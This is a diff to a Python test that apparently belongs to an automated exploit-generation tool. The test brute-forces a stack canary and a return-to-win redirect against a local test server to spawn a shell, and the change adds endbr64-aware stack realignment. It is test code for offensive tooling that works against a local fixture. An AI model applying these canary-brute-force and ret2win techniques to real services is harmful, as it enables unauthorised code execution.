@@ -165,7 +165,13 @@ def test_the_whole_chain_spawns_a_shell_and_the_canary_is_load_bearing(canary_se
     pad = brop.canary_pad(f["ret_offset"], f["canary"], canary_offset=f["canary_offset"])
     markers = attribution.make_code_markers()
     oracle = brop.socket_oracle(canary_server.port, markers.command + b"\n", timeout=1.0, gap=0.1)
-    res = brop.brute_ret2win(oracle, f["ret_offset"], win_off, markers, pad=pad)
+    # The alignment partner must be endbr64-AWARE, exactly as the real pipeline computes it
+    # (exploit_stage _pie_brop_* pass aligns=(0, realign)): a system() call needs a 16-byte-aligned
+    # rsp, and the realign entry that skips `push rbp` is win+1 on a plain prologue but win+5 on a
+    # CET binary (endbr64 is 4 bytes first). Default gcc emits endbr64, so a hardcoded (0,1) lands
+    # mid-endbr64 and the redirect never confirms on a modern host.
+    realign = exploit.win_realign_entry(tb, win_off) - win_off
+    res = brop.brute_ret2win(oracle, f["ret_offset"], win_off, markers, pad=pad, aligns=(0, realign))
     assert res, "no leak-free redirect to win() through the canary"
     payload, _nbytes, _align = res
     bad = bytearray(payload)
